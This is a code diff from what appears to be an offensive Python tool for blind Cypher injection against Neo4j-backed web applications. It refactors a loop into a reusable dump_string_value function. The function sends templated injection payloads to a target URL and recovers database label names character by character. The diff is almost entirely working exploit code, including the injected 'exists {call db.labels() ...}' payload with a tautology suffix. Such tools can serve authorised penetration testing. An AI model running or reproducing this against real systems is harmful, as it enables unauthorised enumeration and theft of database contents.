@@ -97,26 +97,34 @@ def get_size_of_label(target_url, label_index, injection_type, blind_string, pos
     print(f"Unable to check size of label with index {label_index}!!!")
     sys.exit(-1)
 
+def dump_string_value(target_url, dump_prefix, dump_size, payload, post_data, cookies_dict, connection_timeout):
+    print("\r"+(80*" ")+"\r"+dump_prefix,end='')
+    dump_value=""
+    for character_number in range(0,dump_size,1):
+        for current_char in ascii_chars:
+            if current_char == "'":
+                current_char="\'"
+            current_payload=payload.replace("%CHARACTER_NUMBER%",str(character_number))
+            current_payload=current_payload.replace("%CURRENT_CHARACTER%",current_char)
+            injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout)
+            if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
+                dump_value+=current_char
+                print("\r"+(80*" ")+f"\r"+dump_prefix+f"{dump_value}",end='')
+                break
+    return dump_value
+
 def dump_labels(target_url, number_of_labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
     global ascii_chars
     label_array=[]
     for label_index in range(0,number_of_labels,1):
         label_size=get_size_of_label(target_url,label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
         print(f"Size of label number {label_index}: {label_size}")
-        print("\r"+(80*" ")+f"\rValue of label number {label_index}: ",end='')
-        label_value=""
-        for character_number in range(0,label_size,1):
-            for current_char in ascii_chars:
-                if current_char == "'":
-                    current_char="\'"
-                payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
-                payload+=" limit 1 where substring(label," + str(character_number) + ",1) = '"+current_char+"' return label}"
-                payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
-                injection_result=cypher_inject(target_url, payload, post_data, cookies_dict, connection_timeout)
-                if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
-                    label_value+=current_char
-                    print("\r"+(80*" ")+f"\rValue of label number {label_index}: {label_value}",end='')
-                    break
+        label_dump_prefix=f"Value of label number {label_index}: " 
+        print("\r"+(80*" ")+"\r"+label_dump_prefix,end='')
+        payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
+        payload+=" limit 1 where substring(label,%CHARACTER_NUMBER%,1) = '%CURRENT_CHARACTER%' return label}"
+        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+        label_value=dump_string_value(target_url, label_dump_prefix, label_size, payload, post_data, cookies_dict, connection_timeout)
         label_array.append(label_value)
         print("\n")
     print("")
